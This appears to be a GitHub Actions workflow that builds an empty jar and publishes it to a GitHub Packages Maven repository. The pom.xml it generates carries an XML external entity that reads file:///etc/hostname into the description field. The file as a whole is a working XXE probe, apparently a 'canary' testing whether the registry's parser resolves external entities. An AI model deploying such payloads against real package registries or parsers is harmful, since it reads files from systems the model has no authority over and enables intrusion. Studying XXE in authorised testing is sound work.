name: G10 Maven parser canary
on:
  push:
    paths:
      - .github/workflows/g10-maven-parser.yml
permissions:
  contents: read
  packages: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
          server-id: github
          server-username: GITHUB_ACTOR
          server-password: GITHUB_TOKEN
      - name: Build and publish parser canary
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -eux
          mkdir -p /tmp/g10m/empty
          jar cf /tmp/g10m/g10-parser-30853164675.jar -C /tmp/g10m/empty .
          cat > /tmp/g10m/pom.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE project [
  <!ENTITY g10 SYSTEM "file:///etc/hostname">
]>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.apexblack.g10</groupId>
  <artifactId>g10-parser-30853164675</artifactId>
  <version>1.0.0</version>
  <packaging>jar</packaging>
  <description>&g10;</description>
</project>
EOF
          mvn -B deploy:deploy-file -Dfile=/tmp/g10m/g10-parser-30853164675.jar -DpomFile=/tmp/g10m/pom.xml -DrepositoryId=github -Durl=https://maven.pkg.github.com/apexblack-koala-274804/chainship-test-release
